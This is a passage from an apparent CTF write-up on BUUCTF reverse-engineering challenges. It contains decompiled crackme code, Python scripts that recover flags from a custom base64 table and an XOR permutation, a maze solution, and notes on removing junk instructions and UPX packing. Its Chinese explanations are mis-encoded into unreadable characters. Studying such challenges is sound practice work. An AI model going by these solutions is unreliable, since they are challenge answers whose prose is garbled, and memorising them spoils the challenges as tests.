v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+18h] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  sub_401000();</span><br><span class="line">  v5 = a2 % <span class="number">3</span>;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  v7 = a2 - a2 % <span class="number">3</span>;</span><br><span class="line">  v15 = a2 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(v5) = a1[v3];</span><br><span class="line">      v3 += <span class="number">3</span>;</span><br><span class="line">      v8 = v4 + <span class="number">1</span>;</span><br><span class="line">      *(a3 + v8 - <span class="number">1</span>) = aAbcdefghijklmn[(v5 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">      *(a3 + v8++) = aAbcdefghijklmn[<span class="number">16</span> * (a1[v3 - <span class="number">3</span>] &amp; <span class="number">3</span>) + ((a1[v3 - <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>)];</span><br><span class="line">      *(a3 + v8++) = aAbcdefghijklmn[<span class="number">4</span> * (a1[v3 - <span class="number">2</span>] &amp; <span class="number">0xF</span>) + ((a1[v3 - <span class="number">1</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>)];</span><br><span class="line">      v5 = a1[v3 - <span class="number">1</span>] &amp; <span class="number">0x3F</span>;</span><br><span class="line">      v4 = v8 + <span class="number">1</span>;</span><br><span class="line">      *(a3 + v4 - <span class="number">1</span>) = aAbcdefghijklmn[v5];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; v7 );</span><br><span class="line">    v5 = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v7) = a1[v3];</span><br><span class="line">    v9 = v4 + <span class="number">1</span>;</span><br><span class="line">    *(a3 + v9 - <span class="number">1</span>) = aAbcdefghijklmn[(v7 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v10 = v9 + <span class="number">1</span>;</span><br><span class="line">    *(a3 + v10 - <span class="number">1</span>) = aAbcdefghijklmn[<span class="number">16</span> * (a1[v3] &amp; <span class="number">3</span>)];</span><br><span class="line">    *(a3 + v10) = <span class="number">61</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">    v13 = v10 + <span class="number">1</span>;</span><br><span class="line">    *(a3 + v13) = <span class="number">61</span>;</span><br><span class="line">    v4 = v13 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v4 + <span class="number">1</span>;</span><br><span class="line">    *(a3 + v11 - <span class="number">1</span>) = aAbcdefghijklmn[(a1[v3] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v12 = &amp;a1[v3 + <span class="number">1</span>];</span><br><span class="line">    LOBYTE(v6) = *v12;</span><br><span class="line">    v10 = v11 + <span class="number">1</span>;</span><br><span class="line">    *(a3 + v10 - <span class="number">1</span>) = aAbcdefghijklmn[<span class="number">16</span> * (a1[v3] &amp; <span class="number">3</span>) + ((v6 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>)];</span><br><span class="line">    *(a3 + v10) = aAbcdefghijklmn[<span class="number">4</span> * (*v12 &amp; <span class="number">0xF</span>)];</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_9:</span><br><span class="line">  *(a3 + v4) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_401030(a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_401000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( result = <span class="number">6</span>; result &lt; <span class="number">15</span>; ++result )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = aAbcdefghijklmn[result + <span class="number">10</span>];</span><br><span class="line">    aAbcdefghijklmn[result + <span class="number">10</span>] = aAbcdefghijklmn[result];</span><br><span class="line">    aAbcdefghijklmn[result] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> *__cdecl <span class="title">sub_401030</span><span class="params">(<span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = input[HIDWORD(v1)];</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt; <span class="number">97</span> || v2 &gt; <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt; <span class="number">65</span> || v2 &gt; <span class="number">90</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        LOBYTE(v1) = v2 + <span class="number">32</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(v1) = v2 - <span class="number">32</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      input[HIDWORD(v1)] = v1;</span><br><span class="line">LABEL_9:</span><br><span class="line">      LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">      ++HIDWORD(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( HIDWORD(v1) &lt; <span class="built_in">strlen</span>(input) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_401080ä¸»è¦æ˜¯ä¸‰éƒ¨åˆ†ï¼š</p><ul><li>  sub_401000ï¼šæ¢base64è¡¨</li><li>  base64</li><li>  å¤§å°å†™è½¬æ¢çš„æ“ä½œ</li></ul><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ‹¿æœ¬åœ°çš„strå…ˆå¤§å°å†™è½¬æ¢ï¼Œæ¢è¡¨ï¼Œåœ¨decodeå°±OK</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span>.swapcase()</span><br><span class="line">base = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">A2Z = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">base = <span class="built_in">list</span>(base)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">15</span>):</span><br><span class="line">    a = base[i]</span><br><span class="line">    base[i] = base[i+<span class="number">10</span>]</span><br><span class="line">    base[i+<span class="number">10</span>] = a</span><br><span class="line"></span><br><span class="line">base = <span class="string">&#x27;&#x27;</span>.join(base)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    flag += A2Z[base.find(<span class="built_in">str</span>[i])]</span><br><span class="line">    <span class="built_in">print</span>(A2Z[base.find(<span class="built_in">str</span>[i])], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">b = base64.b64decode(flag)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><h1 id="0x0F-MRCTF2020-Transform"><a href="#0x0F-MRCTF2020-Transform" class="headerlink" title="0x0F.[MRCTF2020]Transform"></a>0x0F.[MRCTF2020]Transform</h1><p>æ— å£³ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_402230();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your code:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) != <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    aHknvfymgQbpaJ[i] = input[asc_40F040[i]];</span><br><span class="line">    aHknvfymgQbpaJ[i] ^= LOBYTE(asc_40F040[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">32</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( local_str[j] != aHknvfymgQbpaJ[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Right!Good Job!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is your flag: %s\n&quot;</span>, input);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é•¿åº¦æ˜¯33ï¼Œä¹‹åå’Œæœ¬åœ°çš„ä¸€ä¸ªè¡¨å¼‚æˆ–ï¼Œå†ç­‰äºå¦ä¸€ä¸ªå­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="number">9</span>,<span class="number">10</span>,<span class="number">15</span>, <span class="number">23</span>,<span class="number">7</span>,</span><br><span class="line">         <span class="number">24</span>,<span class="number">12</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">         <span class="number">16</span>,<span class="number">3</span>,<span class="number">17</span>, <span class="number">32</span>, <span class="number">29</span>, <span class="number">11</span>,<span class="number">30</span>,</span><br><span class="line">         <span class="number">27</span>, <span class="number">22</span>,</span><br><span class="line">         <span class="number">4</span>,<span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>,</span><br><span class="line">         <span class="number">21</span>,</span><br><span class="line">         <span class="number">2</span>,</span><br><span class="line">         <span class="number">25</span>,</span><br><span class="line">         <span class="number">5</span>,</span><br><span class="line">         <span class="number">31</span>,</span><br><span class="line">         <span class="number">8</span>,</span><br><span class="line">         <span class="number">18</span>,</span><br><span class="line">         <span class="number">26</span>,</span><br><span class="line">         <span class="number">28</span>,</span><br><span class="line">         <span class="number">14</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">local_str = [</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>]</span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">33</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(table))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(local_str)):</span><br><span class="line">    local_str[i] ^= table[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    flag[table[i]] = local_str[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="0x10-ç›¸å†Œ"><a href="#0x10-ç›¸å†Œ" class="headerlink" title="0x10.ç›¸å†Œ"></a>0x10.ç›¸å†Œ</h1><p>æ ¹æ®æç¤ºè¯´æ˜¯å’Œé‚®ç®±æœ‰å…³ï¼Œjadxæ‰“å¼€æœmailï¼Œæœ‰ä¸ª<code>sendMailByJavaMail</code>ï¼Œä¸”ç¬¬ä¸€ä¸ªå‚æ•°çš„å«ä¹‰å¤§æ¦‚ä¸ºsendtoçš„é‚®ç®±åœ°å€ï¼ŒæŸ¥æ‰¾äº¤å‰å¼•ç”¨ã€‚</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029182421975.png" alt="image-20211029182421975"></p><p>å‘ç°æœ‰ä¸ªmailserverçš„ä¸œè¥¿ï¼Œå¤§æ¦‚ç‡å°±æ˜¯äº†ï¼ŒåæŸ¥å®šä¹‰ï¼Œï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029182507735.png" alt="image-20211029182507735"></p><p>base64è§£ç äº†ä¸€ä¸‹ã€‚</p><p>Javaä¸­NativeMethodä¸€èˆ¬ç”¨äºè°ƒç”¨å¤–éƒ¨æ–‡ä»¶ï¼Œidaæ‰“å¼€libcore.soï¼ŒæŸ¥çœ‹å¯¼å‡º(export)ï¼Œ</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029182804375.png" alt="image-20211029182804375"></p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029183044566.png" alt="image-20211029183044566"></p><p>base64è§£ä¸€ä¸‹å°±å¥½äº†</p><h1 id="0x11-WUSTCTF2020-level2"><a href="#0x11-WUSTCTF2020-level2" class="headerlink" title="0x11.[WUSTCTF2020]level2"></a>0x11.[WUSTCTF2020]level2</h1><p>å°±è„±ä¸ªupxå°±OK</p><h1 id="0x12-HDCTF2019-Maze"><a href="#0x12-HDCTF2019-Maze" class="headerlink" title="0x12.[HDCTF2019]Maze"></a>0x12.[HDCTF2019]Maze</h1><p>è¿™ä¸ªé¢˜å­¦åˆ°çŸ¥è¯†ç‚¹äº†ã€‚</p><p>å¿˜äº†æœ‰æ²¡æœ‰å£³äº†ï¼Œæœ‰ä¹Ÿæ˜¯upxï¼Œè„±äº†å°±è¡Œ</p><p>idaæŸ¥çœ‹æ˜¯è¿™æ ·ï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029232619651.png" alt="image-20211029232619651"></p><p>mainä¸‹é¢æœ‰ä¸€å †æ•°æ®ï¼Œf5ä¸äº†ï¼›è€Œä¸”ä¸Šé¢æœ‰ä¸ªjnzçš„æŒ‡ä»¤ï¼Œç›¸å½“äºæ²¡è·³è½¬ï¼Œè€Œcallçš„ä¹Ÿæ˜¯ä¸ªä¹±çš„åœ°å€ã€‚è¿™æ®µä»£ç åŠ äº†èŠ±æŒ‡ä»¤ï¼Œidaåˆ†æé”™äº†ã€‚</p><p>é¦–å…ˆå°†jnzç»™nopæ‰ï¼Œå¯ä»¥ç›´æ¥idaä¹Ÿå¯odï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029232903932.png" alt="image-20211029232903932"></p><p>ä¹‹åæ˜¯callï¼Œå½“ç„¶ä¸èƒ½å…¨nopï¼Œåé¢å¯èƒ½ä¼šæœ‰ä»£ç ï¼ŒæŒ‰dè½¬ä¸ºå­—èŠ‚æ•°æ®ï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029233029066.png" alt="image-20211029233029066"></p><p>ç„¶åä¸€æ­¥æ­¥æµ‹è¯•æ”¹ä¸ºnopï¼Œä¹‹åä¼šå‘ç°idaè‡ªåŠ¨å°±æŠŠåé¢ç»™æ˜¾ç¤ºä¸ºäº†ä»£ç ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸èƒ½f5ï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029233330994.png" alt="image-20211029233330994"></p><p>è¿™æ˜¯å› ä¸ºè¿™å—è¿˜ä¸æ˜¯å‡½æ•°ï¼Œä¹‹åå°†çº¢è‰²çš„texté€‰ä¸­æŒ‰pï¼Œå°†è¿™å—å¼„ä¸ºå‡½æ•°ï¼Œä¹‹åå°±å¯f5äº†ï¼Œç®€å•çš„è¿·å®«é¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+10h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">16</span>]; <span class="comment">// [esp+14h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Go through the maze to get the flag!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%14s&quot;</span>, flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( flag[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        --*asc_408078;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        ++*asc_408078;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        --dword_40807C;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        ++dword_40807C;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">//åˆå§‹åˆ†åˆ«ä¸º7å’Œ0</span></span><br><span class="line">  <span class="keyword">if</span> ( *asc_408078 == <span class="number">5</span> &amp;&amp; dword_40807C == <span class="number">-4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulations!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here is the flag:flag&#123;%s&#125;\n&quot;</span>, flag);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try again...\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿·å®«å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*******+**</span><br><span class="line">******* **</span><br><span class="line">****    **</span><br><span class="line">**   *****</span><br><span class="line">** **F****</span><br><span class="line">**    ****</span><br><span class="line">**********</span><br><span class="line">//ssaaasaassdddw</span><br></pre></td></tr></table></figure><h1 id="0X13-GWCTF-2019-xxorï¼ˆæœªå®Œï¼‰"><a href="#0X13-GWCTF-2019-xxorï¼ˆæœªå®Œï¼‰" class="headerlink" title="0X13.[GWCTF 2019]xxorï¼ˆæœªå®Œï¼‰"></a>0X13.[GWCTF 2019]xxorï¼ˆæœªå®Œï¼‰</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6[<span class="number">6</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 v7[<span class="number">6</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7[<span class="number">5</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let us play a game?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;you have six chances to input&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Come on!&quot;</span>);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">3</span>] 